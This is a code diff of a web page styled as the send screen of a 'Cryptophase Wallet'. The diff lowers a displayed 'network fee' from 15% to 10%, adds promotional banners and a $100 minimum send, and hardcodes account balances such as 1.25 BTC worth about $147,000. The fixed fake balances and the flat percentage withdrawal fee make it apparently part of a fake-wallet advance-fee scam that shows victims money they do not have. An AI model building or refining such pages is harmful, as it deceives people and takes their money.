@@ -234,8 +234,8 @@
         }
         
         .fee-notice {
-            background: rgba(231, 76, 60, 0.1);
-            border: 1px solid rgba(231, 76, 60, 0.3);
+            background: rgba(52, 152, 219, 0.1);
+            border: 1px solid rgba(52, 152, 219, 0.3);
             border-radius: 8px;
             padding: 12px;
             margin-top: 15px;
@@ -244,7 +244,7 @@
         }
         
         .fee-notice span {
-            color: #e74c3c;
+            color: #3498db;
             font-weight: 600;
         }
         
@@ -262,6 +262,23 @@
         .trx-fee-display span {
             color: #3498db;
             font-weight: 600;
+        }
+        
+        /* New styles for minimum amount warning */
+        .minimum-warning {
+            background: rgba(231, 76, 60, 0.1);
+            border: 1px solid rgba(231, 76, 60, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 15px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
+        
+        .minimum-warning i {
+            color: #e74c3c;
+            margin-right: 5px;
         }
         
         /* Continue button */
@@ -415,6 +432,17 @@
             color: #ff060a;
         }
         
+        .fee-change-banner {
+            background: linear-gradient(90deg, #2ecc71, #3498db);
+            color: white;
+            text-align: center;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
         @media (max-width: 480px) {
             .container {
                 padding: 15px;
@@ -459,7 +487,11 @@
     <div class="crypto-bg" id="cryptoBg"></div>
       <div class="container">
         <div class="android-banner">
-            <i class=""></i> 
+            <i class="fab fa-android"></i> Cryptophase Wallet v3.2.0 - Network fee reduced to 10%
+        </div>
+        
+        <div class="fee-change-banner">
+            <i class="fas fa-tag"></i> Great news! Network fees reduced to 10%
         </div>
 
         
@@ -491,6 +523,11 @@
                     <div class="conversion">
                         You will receive <span class="conversion-value" id="conversionValue">$0.00</span>
                     </div>
+                    
+                    <!-- Minimum amount warning -->
+                    <div class="minimum-warning" id="minimumWarning">
+                        <i class="fas fa-exclamation-circle"></i> Minimum amount to send is $100 USD
+                    </div>
                 </div>
                 
                 <div class="form-group">
@@ -499,7 +536,7 @@
                 </div>
                 
                 <div class="fee-notice">
-                    <i class="fas fa-info-circle"></i> A <span>15% network fee</span> will be applied to this transaction
+                    <i class="fas fa-info-circle"></i> A <span>10% network fee</span> will be applied to this transaction
                 </div>
                 
                 <!-- New element to display TRX equivalent fee -->
@@ -532,7 +569,7 @@
                     <div class="fee-value" id="withdrawalAmount">0 USDT</div>
                 </div>
                 <div class="fee-row">
-                    <div class="fee-label">Fee (15%):</div>
+                    <div class="fee-label">Fee (10%):</div>
                     <div class="fee-value" id="feeAmount">0 USDT</div>
                 </div>
                 <div class="fee-row">
@@ -580,8 +617,8 @@
                 name: "Bitcoin",
                 symbol: "BTC",
                 icon: "fab fa-btc",
-                balance: 0,
-                usdBalance: 0,
+                balance: 1.25,
+                usdBalance: 147358.75,
                 iconClass: "btc-icon",
                 price: 117887.00
             },
@@ -589,8 +626,8 @@
                 name: "Ethereum",
                 symbol: "ETH",
                 icon: "fab fa-ethereum",
-                balance: 0,
-                usdBalance: 0,
+                balance: 8.75,
+                usdBalance: 25875.16,
                 iconClass: "eth-icon",
                 price: 2957.19
             },
@@ -598,8 +635,8 @@
                 name: "BNB",
                 symbol: "BNB",
                 icon: "fab fa-bnb",
-                balance: 0,
-                usdBalance: 0,
+                balance: 15.5,
+                usdBalance: 10689.10,
                 iconClass: "bnb-icon",
                 price: 689.62
             },
@@ -607,8 +644,8 @@
                 name: "TRON",
                 symbol: "TRX",
                 icon: "fas fa-bolt",
-                balance: 0,
-                usdBalance: 0,
+                balance: 1250,
+                usdBalance: 375,
                 iconClass: "trx-icon",
                 price: 0.30
             },
@@ -623,16 +660,16 @@
             }
         };
         
-        // Get asset from URL
+            // Get asset from URL
         function getAssetFromURL() {
             const urlParams = new URLSearchParams(window.location.search);
             const assetParam = urlParams.get('asset');
             return assetParam || 'btc';
         }
         
-        // Calculate network fee (15% of amount)
+        // Calculate network fee (10% of amount)
         function calculateFee(amount) {
-            return amount * 0.15;
+            return amount * 0.10;
         }
         
         // Calculate TRX equivalent of USDT amount
@@ -655,7 +692,7 @@
             }
         }
         
-             // Load asset data
+        // Load asset data
         function loadAsset() {
             const assetKey = getAssetFromURL();
             const asset = assets[assetKey];
@@ -676,12 +713,23 @@
             assetIcon.className = `asset-icon-large ${asset.iconClass}`;
             assetIcon.innerHTML = `<i class="${asset.icon}"></i>`;
             
+            // Get references to elements
+            const amountInput = document.getElementById('amountInput');
+            const conversionValue = document.getElementById('conversionValue');
+            const warningElement = document.getElementById('minimumWarning');
+            
             // Update conversion rate
-            document.getElementById('amountInput').addEventListener('input', function() {
+            amountInput.addEventListener('input', function() {
                 const amount = parseFloat(this.value) || 0;
                 const usdValue = amount * asset.price;
-                document.getElementById('conversionValue').textContent = 
-                    `$${usdValue.toFixed(2)}`;
+                conversionValue.textContent = `$${usdValue.toFixed(2)}`;
+                
+                // Show/hide minimum amount warning
+                if (usdValue > 0 && usdValue < 100) {
+                    warningElement.style.display = 'block';
+                } else {
+                    warningElement.style.display = 'none';
+                }
                 
                 // Update TRX fee display for USDT
                 if (isUsdt) {
@@ -691,10 +739,16 @@
             
             // Set max button
             document.getElementById('maxBtn').addEventListener('click', function() {
-                document.getElementById('amountInput').value = asset.balance.toFixed(4);
+                amountInput.value = asset.balance.toFixed(4);
                 const usdValue = asset.balance * asset.price;
-                document.getElementById('conversionValue').textContent = 
-                    `$${usdValue.toFixed(2)}`;
+                conversionValue.textContent = `$${usdValue.toFixed(2)}`;
+                
+                // Show/hide warning based on max value
+                if (usdValue < 100) {
+                    warningElement.style.display = 'block';
+                } else {
+                    warningElement.style.display = 'none';
+                }
                 
                 // Update TRX fee display for USDT
                 if (isUsdt) {
@@ -704,8 +758,15 @@
             
             // Continue button
             document.getElementById('continueBtn').addEventListener('click', function() {
-                const amount = parseFloat(document.getElementById('amountInput').value) || 0;
+                const amount = parseFloat(amountInput.value) || 0;
                 const address = document.getElementById('addressInput').value;
+                const usdValue = amount * asset.price;
+                
+                // Validate minimum amount
+                if (usdValue < 100) {
+                    alert('Minimum amount to send is $100 USD');
+                    return;
+                }
                 
                 if (!address) {
                     alert('Please enter a valid address');
@@ -722,7 +783,7 @@
                     return;
                 }
                 
-                // Calculate network fee (15% of amount)
+                // Calculate network fee (10% of amount)
                 const fee = calculateFee(amount);
                 const feeInUSD = fee * asset.price;
                 
